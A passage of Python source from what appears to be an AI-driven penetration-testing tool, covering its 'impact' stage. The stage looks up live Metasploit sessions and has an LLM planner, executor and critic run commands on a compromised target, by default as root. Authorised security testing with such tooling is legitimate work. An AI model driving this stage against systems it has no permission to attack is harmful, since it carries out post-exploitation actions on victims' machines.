    # Ensure actions is a list of strings
    actions = [str(a) for a in actions_taken[:20]]  # Cap at 20

    if success:
        summary = f"Impact complete. Objective '{objective[:50]}' achieved. {len(actions)} actions taken."
    else:
        summary = f"Impact incomplete. Objective '{objective[:50]}' not fully proven. {impact_result[:500] if impact_result else ''}"

    return ImpactFindings(
        success=success,
        actions=actions,
        summary=summary,
    )

# =============================================================================
# ENTRY POINT
# =============================================================================

def run_impact(
    target_ip: str,
    objective: str,
    session_id: str,
    session_type: str,
    access_level: str,
    prior_findings_summary: str = "",
    thread_id: str = None,
    recursion_limit: int = 80,
) -> ImpactFindings:
    import uuid

    if thread_id is None:
        thread_id = f"impact_{uuid.uuid4().hex[:8]}"

    # --- Defect 1: live-session fallback when no session_id was passed in ---
    # The orchestrator returns early on an empty session_id, but run_impact must
    # also defend itself: if called with an empty/blank session_id, do a live MSF
    # lookup and adopt any session that exists for this target before building
    # state. This produces an HONEST, distinct failure ("no live session found")
    # vs. the orchestrator's "no session passed" when nothing can be recovered.
    if not session_id or not str(session_id).strip():
        print_colored(
            "[Impact] No session_id provided — attempting live session lookup...",
            Colors.WARNING,
        )
        live_out = _run_with_timeout(
            msf_session.send_command,
            args=("sessions",),
            kwargs={"timeout": _MSF_SEND_TIMEOUT},
            timeout=_MSF_WALLCLOCK_TIMEOUT,
            on_timeout="(sessions list timed out)",
        )
        live_str = str(live_out)
        found_sid, found_type = _parse_session_for_target(live_str, target_ip)
        if found_sid:
            session_id = found_sid
            if found_type:
                session_type = found_type
            print_colored(
                f"[Impact] Live lookup found session #{session_id} "
                f"({session_type}) for {target_ip} — proceeding.",
                Colors.OKGREEN,
            )
        else:
            print_colored(
                f"[Impact] No live session for {target_ip} found "
                f"(lookup: {live_str[:120]}) — skipping impact.",
                Colors.WARNING,
            )
            return ImpactFindings(
                success=False,
                actions=[],
                summary="Impact skipped — no live session found for target after live lookup.",
            )

    workflow = build_graph()
    checkpointer = MemorySaver()
    app = workflow.compile(checkpointer=checkpointer)

    config = {
        "configurable": {"thread_id": thread_id},
        "recursion_limit": recursion_limit,
    }

    initial_state = {
        "messages": [HumanMessage(content=(
            f"Execute impact actions for objective: {objective}\n"
            f"Target: {target_ip}\n"
            f"Session: {session_type} (ID: {session_id})\n"
            f"Access level: {access_level}\n\n"
            f"IMPORTANT: To run commands on the target, use tool_session_command(\"{session_id}\", \"<command>\").\n"
            f"This runs directly on the target via the MSF session API — reliable and atomic.\n"
            f"Do NOT use tool_metasploit_rpc for target commands. Do NOT use tool_linux_terminal for target commands."
        ))],
        "target_ip": target_ip,
        "objective": objective,
        "session_id": session_id,
        "session_type": session_type,
        "access_level": access_level,
        "prior_findings": prior_findings_summary,
        "impact_plan": "",
        "impact_result": "",
        "actions_taken": [],
        "loop_step": 0,
        "critic_verdict": "",
        "_verify_prompted": False,
        "_session_dead_prompted": False,
    }

    print_colored(f"\n{'='*60}", Colors.HEADER)
    print_colored(f"[run_impact] Starting impact subgraph", Colors.HEADER)
    print_colored(f"  Target: {target_ip}", Colors.HEADER)
    print_colored(f"  Objective: {objective[:80]}", Colors.HEADER)
    print_colored(f"  Session: {session_type} #{session_id}", Colors.HEADER)
    print_colored(f"  Access: {access_level}", Colors.HEADER)
    print_colored(f"  Thread: {thread_id}", Colors.HEADER)
    print_colored(f"{'='*60}\n", Colors.HEADER)

    # --- Session health check: verify session is still alive ---
    # Wall-clock capped: a busy/wedged console must not block the stage on the
    # very first call before any impact work begins.
    try:
        session_check = _run_with_timeout(
            msf_session.send_command,
            args=("sessions",),
            kwargs={"timeout": _MSF_SEND_TIMEOUT},
            timeout=_MSF_WALLCLOCK_TIMEOUT,
            on_timeout="(sessions list timed out)",
        )
        session_check_str = str(session_check)
        # If the capped call timed out or errored, don't falsely declare the
        # session dead — proceed optimistically and let the graph discover the
        # truth (the executor's own session calls are individually capped too).
        if session_check_str.strip() in ("(sessions list timed out)",) \
                or session_check_str.startswith("(call failed:"):
            print_colored(f"[Impact] Session health check inconclusive ({session_check_str[:80]}) — proceeding.", Colors.WARNING)
        # Defect 3: explicit empty-session_id guard. re.escape('') is '' so the
        # line-anchored pattern below collapses to r'(?m)^\s*\s' which matches
        # ANY whitespace-containing line — trivially passing for empty IDs and
        # baking session_id='' into state + every prompt. The Defect-1 fallback
        # above normally resolves a real ID first; this guards the path where
        # run_impact is called directly (e.g. a test harness) with no live
        # session, so we never enter the graph with a broken session_id.
        elif not str(session_id).strip():
            print_colored(
                "[Impact] Empty session_id and no live session found — skipping.",
                Colors.WARNING,
            )
            return ImpactFindings(
                success=False,
                actions=[],
                summary="Impact skipped — empty session_id and no live session found.",
            )
        # Line-anchored match: MSF `sessions` lists the ID as a standalone token
        # at the start of a line ("3  shell ..."). A bare substring check would
        # false-positive when session_id='3' but only sessions 13/30 are alive.
        elif not re.search(r'(?m)^\s*' + re.escape(str(session_id)) + r'\s', session_check_str):
            print_colored(f"[Impact] Session {session_id} NOT found in active sessions — skipping impact.", Colors.WARNING)
            print_colored(f"[Impact] Active sessions output: {session_check_str[:300]}", Colors.WARNING)
            return ImpactFindings(
                success=False,
                actions=[],
                summary=f"Impact skipped — session {session_id} is no longer active.",
            )
        else:
            print_colored(f"[Impact] Session {session_id} confirmed alive.", Colors.OKGREEN)
    except Exception as e:
        print_colored(f"[Impact] Session health check failed: {e}", Colors.WARNING)
        # Try to continue anyway — the session might still work

    try:
        for event in app.stream(initial_state, config=config):
            for key, value in event.items():
                if not value or "messages" not in value:
                    continue
                msgs = value["messages"]
                if not isinstance(msgs, list):
                    msgs = [msgs]
                for msg in msgs:
                    if not isinstance(msg, BaseMessage) or not msg.content:
                        continue
                    if "CRITIC FEEDBACK" in msg.content:
                        print_colored(f"\n{msg.content}", Colors.FAIL)
                    elif isinstance(msg, ToolMessage):
                        display = msg.content[:500]
                        if len(msg.content) > 500:
                            display += "... [truncated]"
                        print(f"\n[Tool Output]: {display}")
                    elif isinstance(msg, AIMessage):
                        content = msg.content
                        if "[Impact Planner]" in content:
                            print_colored(f"\n{content[:400]}", Colors.OKBLUE)
                        elif "[Impact Critic]" in content:
                            color = Colors.OKGREEN if "PASS" in content else Colors.FAIL
                            print_colored(f"\n{content[:400]}", color)
                        else:
                            print_colored(f"\nAgent: {content[:400]}", Colors.OKGREEN)

                    if hasattr(msg, "tool_calls") and msg.tool_calls:
                        for t in msg.tool_calls:
                            print_colored(
                                f"   (Calling Tool: {t['name']} args: {str(t['args'])[:200]}...)",
                                Colors.OKCYAN
                            )
    except Exception as e:
        print_colored(f"\n[Impact] Subgraph crashed: {e}", Colors.FAIL)
        print_colored("[Impact] Returning graceful failure.", Colors.WARNING)
        return ImpactFindings(
            success=False,
            actions=[],
            summary=f"Impact crashed: {str(e)[:200]}",
        )

    final_snapshot = app.get_state(config)
    final_state = final_snapshot.values

    findings = _extract_impact_findings(final_state)

    print_colored(f"\n{'='*60}", Colors.HEADER)
    print_colored(
        f"[run_impact] Complete — success={findings['success']}",
        Colors.OKGREEN if findings["success"] else Colors.FAIL
    )
    print_colored(f"  {findings['summary']}", Colors.OKCYAN)
    print_colored(f"{'='*60}\n", Colors.HEADER)

    return findings

# =============================================================================
# STANDALONE MAIN
# =============================================================================

def main():
    if "--graph" in sys.argv:
        workflow = build_graph()
        app = workflow.compile()
        try:
            print(app.get_graph().draw_ascii())
        except Exception:
            graph = app.get_graph()
            print("Nodes:", [n for n in graph.nodes])
            print("Edges:", [(e.source, e.target) for e in graph.edges])
        return

    print_colored("--- Impact Stage (Standalone) ---", Colors.OKGREEN)
    print_colored("Nodes: planner → executor → critic", Colors.OKCYAN)

    target_ip = input("\n[Target IP]: ").strip()
    objective = input("[Objective]: ").strip() or "Prove full access to the target system"
    session_id = input("[Session ID]: ").strip()
    session_type = input("[Session Type (command_shell/meterpreter)]: ").strip() or "command_shell"
    access_level = input("[Access Level (user/root)]: ").strip() or "root"

    findings = run_impact(
        target_ip=target_ip,
        objective=objective,
        session_id=session_id,
        session_type=session_type,
        access_level=access_level,
    )

    print("\n" + json.dumps(dict(findings), indent=2, default=str))


if __name__ == "__main__":
    main()